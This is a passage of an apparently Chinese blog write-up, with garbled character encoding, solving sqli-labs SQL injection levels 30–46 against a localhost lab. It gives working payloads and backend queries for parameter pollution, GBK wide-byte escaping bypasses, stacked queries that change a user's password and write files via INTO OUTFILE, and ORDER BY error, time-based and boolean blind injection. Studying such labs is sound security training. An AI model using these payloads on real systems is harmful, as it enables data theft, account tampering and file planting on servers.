href="https://blog.csdn.net/qq_43263647/article/details/105493277?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.queryctrv2&spm=1001.2101.3001.4242.2&utm_relevant_index=4">IDEAä¸­å¯¼å…¥mysqlçš„é©±åŠ¨jaråŒ…</a><br><a href="https://blog.csdn.net/weixin_48557496/article/details/113776824">å°†é©±åŠ¨mysql-connector-java.jaråŒ…å¯¼å…¥IDEA</a></p><h3 id="level-30"><a href="#level-30" class="headerlink" title="level-30"></a>level-30</h3><p><strong>WAFç®€å•ç»•è¿‡-å‚æ•°è§£æ-åŒå¼•å·</strong><br>ç±»ä¼¼level-29,ä¸æ·±å…¥å±•ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">30</span>/?<span class="built_in">id</span>=<span class="number">123</span>&amp;<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;union select 1,2,database()#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-18-18.png"></p><h3 id="level-31"><a href="#level-31" class="headerlink" title="level-31"></a>level-31</h3><p><strong>WAFç®€å•ç»•è¿‡-å‚æ•°è§£æ-åŒå¼•å·-å•æ‹¬å·</strong><br>ç±»ä¼¼level-29,ä¸æ·±å…¥å±•ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">31</span>/?<span class="built_in">id</span>=<span class="number">456</span>&amp;<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,2,database()%23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-21-23.png"></p><h3 id="level-32"><a href="#level-32" class="headerlink" title="level-32"></a>level-32</h3><p><strong>tomcatï¼Œå•å¼•å·-å•æ‹¬å·æ³¨å…¥</strong><br>åŸç†å’ŒPHPä¸€æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;) union select 1,2,3%23 </span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Username: Dumb</span></span><br><span class="line"><span class="string">Password: Username: 2</span></span><br><span class="line"><span class="string">Password: 3</span></span><br></pre></td></tr></table></figure><p><strong>apache ,å®½å­—èŠ‚æ³¨å…¥</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº† åæ–œæ \ å•å¼•å· åŒå¼•å·  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br></pre></td></tr></table></figure><p>å°†ç¼–ç è®¾ç½®ä¸º GBKï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¼–ç é—®é¢˜ï¼ŒMySQL åœ¨ä½¿ç”¨GBKç¼–ç æ—¶ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œæ¯”å¦‚  <code>%bb%5c</code>æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼ˆå‰ä¸€ä¸ª ASCII ç å¤§äº 128 æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰<a href="#refer-anchor-5"><sup>1</sup></a>ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæ±‰å­—å³ ç± ã€‚<br>è€Œæˆ‘ä»¬è¾“å…¥å•å¼•å· <code>&#39;</code> å³ <code>%27</code>ï¼Œä¼šè¢«è½¬ä¹‰æˆ <code>\&#39;</code> å³  <code>%5c%27</code>ï¼Œæ‰€ä»¥å“¦æˆ‘ä»¬å¯ä»¥æ„é€   <code>%bb%27</code>,è¢«è½¬ä¹‰åä¸º  <code>%bb%5c%27</code>ï¼Œå³<code>ç± &#39;</code>ï¼Œå°±é¥¶è¿‡äº†å•å¼•å·çš„è½¬ä¹‰ã€‚<br>è¿˜æœ‰å°±æ˜¯åˆ©ç”¨å•å¼•å·å¯¹å•å¼•å·çš„è½¬ä¹‰ï¼Œæ¯”å¦‚<code>\\\\&#39;</code>å³<code>\\&#39;</code>  ï¼Œæ„é€ <code>%bb%5c%5c%%27</code>,è½¬ä¹‰çš„æ—¶å€™ï¼Œä¼šåœ¨<code>%5c</code>å‰åŠ <code>%5c</code>ï¼Œ<code>%27</code>å‰åŠ <code>%5c</code>å³<code>%bb %5c%5c %5c %5c %5c%27</code>ï¼Œå³<code>%bb%5c %5c%5c %5c%5c %27</code>ï¼Œå³ç± <code>\\&#39;</code><br>æ‰€ä»¥å°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼ŒæŠŠå•å¼•å·é‡Šæ”¾å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,username <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>%<span class="number">23</span></span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1ï¿½\&#x27; union select 1,2,username from users limit 2,1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:Dummy</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%5c%5c%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,username <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>%<span class="number">23</span></span><br><span class="line">è½¬ä¹‰å</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1ï¿½\\\\\&#x27; union select 1,2,username from users limit 2,1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:Dummy</span><br></pre></td></tr></table></figure><p><strong>å¼•ç”¨ï¼š</strong></p><div id="refer-anchor-5"></div><ul><li>[1] <a href="https://www.jianshu.com/p/fa6664786f73">Sqli-Labsï¼šLess 32 - Less 33</a></li></ul><h3 id="level-33"><a href="#level-33" class="headerlink" title="level-33"></a>level-33</h3><p>ç”¨çš„phpåŸç”Ÿaddslasheså‡½æ•°<br>expå’Œlevel-32ä¸€æ ·</p><h3 id="level-34"><a href="#level-34" class="headerlink" title="level-34"></a>level-34</h3><p><strong>POSTå‹-addslashesè¿‡æ»¤-å•å¼•å·</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a%bb%27union select <span class="number">1</span>,<span class="number">2</span>%<span class="number">23</span>&amp;passwd=a&amp;submit=Submit</span><br><span class="line">åç«¯</span><br><span class="line">SELECT username, password FROM users WHERE username=<span class="string">&#x27;aÂ»\&#x27;union select 1,2#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">&gt;Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§ï¼Œä½¿ç”¨ä¸€ä¸ªutfè½¬ç ï¼Œä¾‹å¦‚ä½¿ç”¨ UTF-8 çš„â€™è½¬æ¢ä¸º UTF-16 çš„ï¿½â€™<br>ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•ä½¿ç”¨%bb å’Œï¿½çš„é•¿åº¦ä¸€æ ·ï¼Œè€Œï¿½çš„asciiæ˜¯0xfffdï¼Œå¾ˆå¥‡æ€ªï¼Œå¾…è¡¥å……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">uname=aÃ½%27union select <span class="number">1</span>,<span class="number">2</span>%<span class="number">23</span>&amp;passwd=a&amp;submit=Submit</span><br><span class="line">æ‹¼æ¥å</span><br><span class="line">&gt;SELECT username, password FROM users WHERE username=<span class="string">&#x27;aÃ½\&#x27;union select 1,2#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="level-35"><a href="#level-35" class="headerlink" title="level-35"></a>level-35</h3><p>ç”¨çš„phpåŸç”Ÿaddslasheså‡½æ•°ï¼Œè€Œä¸”æ²¡æœ‰å•å¼•å·ï¼Œç›´æ¥å¸¸è§„æ³¨å…¥å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-35/?id=-1 union select 1,2,3%23</span><br></pre></td></tr></table></figure><h3 id="level-36"><a href="#level-36" class="headerlink" title="level-36"></a>level-36</h3><p><strong>mysql_real_escape_string-å•å¼•å·-æŠ¥é”™å›æ˜¾-ç»•è¿‡</strong><br>å’Œå‰é¢åŸç†ä¸€æ ·<br>mysql_real_escape_stringè¿‡æ»¤å­—ç¬¦å¦‚ä¸‹ï¼Œä¹Ÿæ˜¯ç”¨åæ–œæ è½¬ä¹‰</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>â€˜</li><li>â€œ</li><li>\x1a  </li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">36</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%<span class="number">27</span><span class="keyword">or</span> <span class="number">1</span>%<span class="number">23</span></span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1ï¿½\&#x27;or 1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-37"><a href="#level-37" class="headerlink" title="level-37"></a>level-37</h3></li></ul><p><strong>POSTå‹-mysql_real_escape_string-å•å¼•å·-åæŠ¥é”™å›æ˜¾-ç»•è¿‡</strong><br>å’Œlevel-36åŸç†ä¸€æ ·ï¼Œåªä¸è¿‡æ˜¯POSTï¼Œä¸ç»†è‡´å±•å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a%bb%27union select <span class="number">1</span>,<span class="number">2</span>;<span class="comment">#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line">æ‹¼æ¥å</span><br><span class="line">SELECT username, password FROM users WHERE username=<span class="string">&#x27;aÂ»\&#x27;union select 1,2;#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="Stacked"><a href="#Stacked" class="headerlink" title="Stacked"></a>Stacked</h2><h3 id="level-38"><a href="#level-38" class="headerlink" title="level-38"></a>level-38</h3><p><strong>GET-å•å¼•å·-ç®€å•å †å æ³¨å…¥</strong><br>å †å æ³¨å…¥ï¼Œå³query1;query2;queryâ€¦â€¦;  è¿™æ ·å¤šä¸ªsqlè¯­å¥æ”¾åœ¨ä¸€èµ·æ³¨å…¥<br>è¿™æ¬¡levelæ›´æ”¹äº†sqlæŸ¥è¯¢APIï¼Œmysqli_multi_queryï¼Œçœ‹çœ‹å®ƒå’Œmysql_queryçš„åŒºåˆ«ï¼Œå¯ä»¥çœ‹åˆ°mysqli_multi_queryå¯ä»¥ä¸€æ¬¡ä½¿ç”¨å¤šä¸ªè¯­å¥ï¼Œä¹Ÿå°±ä¸ºå †å æ³¨å…¥åˆ›é€ äº†æ¡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(query,connection)</span><br><span class="line">queryå¿…éœ€ã€‚è§„å®šè¦å‘é€çš„ SQL æŸ¥è¯¢ã€‚æ³¨é‡Šï¼šæŸ¥è¯¢å­—ç¬¦ä¸²ä¸åº”ä»¥åˆ†å·ç»“æŸã€‚</span><br><span class="line">connectionå¯é€‰ã€‚è§„å®š SQL è¿æ¥æ ‡è¯†ç¬¦ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªæ‰“å¼€çš„è¿æ¥ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(connection,query);</span><br><span class="line">connectionå¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„ MySQL è¿æ¥ã€‚</span><br><span class="line">queryå¿…éœ€ã€‚è§„å®šä¸€ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢ï¼Œç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä»»æ„åˆ©ç”¨åé¢è¿™å¥è¯ï¼Œä»¥æ›´æ”¹å¯†ç ä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹æ•°æ®</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">38</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;;update users set password =&#x27;</span><span class="number">1234</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;%23</span></span><br><span class="line"><span class="string">å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-38/?id=1&#x27;</span>;select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-38\\test.php&quot;</span>;%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸä¿®æ”¹Dumbå¯†ç </p><p><img src="/2022/02/17/sqli-labs/2022-02-24-12-48-01.png"></p><p>æˆåŠŸå†™å…¥åå°æ–‡ä»¶   </p><p><img src="/2022/02/17/sqli-labs/2022-02-24-12-48-35.png"></p><h3 id="level-39"><a href="#level-39" class="headerlink" title="level-39"></a>level-39</h3><p><strong>GET-ç®€å•å †å æ³¨å…¥</strong></p><p>åŸç†åŒlevel-38<br>ä»…å±•ç¤ºæ›´æ–°Dumbå¯†ç ï¼Œä¸ç»†è‡´å±•å¼€   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">39</span>/?<span class="built_in">id</span>=<span class="number">1</span>; update users <span class="built_in">set</span> password= <span class="string">&#x27;234&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>;%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-40"><a href="#level-40" class="headerlink" title="level-40"></a>level-40</h3><p><strong>GET-ç›²æ³¨-å­—ç¬¦å‹-ç®€å•å †å æ³¨å…¥</strong><br>åŸç†å’Œä¹‹å‰ä¸€æ ·ï¼Œä¸ç»†è‡´å±•å¼€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-40/?id=1&#x27;);update users set password=&#x27;123&#x27; where username=&#x27;Dumb&#x27;%23 </span><br></pre></td></tr></table></figure><h3 id="level-41"><a href="#level-41" class="headerlink" title="level-41"></a>level-41</h3><p><strong>GET-ç›²æ³¨-æ•´å‹-ç®€å•å †å æ³¨å…¥</strong><br>ä¸ç»†è‡´å±•å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">41</span>/?<span class="built_in">id</span>=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;234&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>%<span class="number">23</span> </span><br></pre></td></tr></table></figure><h3 id="level-42"><a href="#level-42" class="headerlink" title="level-42"></a>level-42</h3><p><strong>POST-å•å¼•å·-ç®€å•è¿‡æ»¤-ç®€å•å †å æ³¨å…¥</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$con1</span>, <span class="variable">$dbname</span>) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">&quot;Unable to connect to the database ######: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°usernameè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯passwordæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">login_user=a<span class="string">&#x27;&amp;login_password=a&#x27;</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;2345&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>%<span class="number">23</span> &amp;mysubmit=Login   </span><br></pre></td></tr></table></figure><h3 id="level-43"><a href="#level-43" class="headerlink" title="level-43"></a>level-43</h3><p><strong>POST-å•å¼•å·-å•æ‹¬å·-ç®€å•è¿‡æ»¤-ç®€å•å †å æ³¨å…¥</strong><br>ä¸level-42åŸç†ç›¸åŒï¼Œä¸ç»†è‡´å±•å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a<span class="string">&#x27;); update users set password=&#x27;</span><span class="number">111</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23 &amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-44"><a href="#level-44" class="headerlink" title="level-44"></a>level-44</h3><p><strong>POST-å•å¼•å·-ç›²æ³¨-ç®€å•è¿‡æ»¤-ç®€å•å †å æ³¨å…¥</strong><br>ä¸level-42åŸç†ç›¸åŒï¼Œä¸ç»†è‡´å±•å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=aa<span class="string">&#x27;; update users set password=&#x27;</span><span class="number">222</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-45"><a href="#level-45" class="headerlink" title="level-45"></a>level-45</h3><p><strong>POST-å•å¼•å·-å•æ‹¬å·-ç®€å•è¿‡æ»¤-ç®€å•å †å æ³¨å…¥</strong><br>åŸç†åŒä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a<span class="string">&#x27;); update users set password=&#x27;</span><span class="number">232</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-46"><a href="#level-46" class="headerlink" title="level-46"></a>level-46</h3><p><strong>ORDER BY-æœ‰æŠ¥é”™å›æ˜¾-æ³¨å…¥</strong><br>å…³é”®ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY $id&quot;</span>;</span><br></pre></td></tr></table></figure><p>å› ä¸ºORDER BY åé¢æ˜¯éœ€è¦ä¸€ä¸ªæ•°å­—ï¼Œä¸åŒçš„æ•°å­—è¿”å›å€¼ä¸ä¸€æ ·ï¼Œæˆ–è€…æ²¡æœ‰è¿”å›ï¼Œæ‰€ä»¥ä»–å’Œæˆ‘ä»¬æ³¨å…¥ç‚¹ä¸€æ ·ï¼Œç›¸å½“äºä¸€ä¸ªæŸ¥è¯¢å­—æ®µå‚æ•°ï¼Œæ‰€ä»¥ä¹‹å‰çš„æ‰‹æ³•éƒ½å¯ä»¥ç”¨<br>1ã€æŠ¥é”™æ³¨å…¥ï¼Œæœ‰æŠ¥é”™å›æ˜¾å¯ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>2ã€æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),null)</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),null)</span><br><span class="line">å›æ˜¾</span><br><span class="line">æ…¢äº†ä¸‰ç§’</span><br></pre></td></tr></table></figure><p>3ã€å¸ƒå°”æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">åŒorder by <span class="number">1</span>,å³sort=<span class="number">1</span>ï¼Œå› ä¸ºlength(database())=<span class="number">8</span> å€¼ä¸ºçœŸ</span><br></pre></td></tr></table></figure><p>4ã€å†™å…¥æ–‡ä»¶ï¼Œéœ€è¦å¯¹åº”å‚æ•°æ‰“å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> (select database() ) into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span>;</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> (select database() ) into outfile 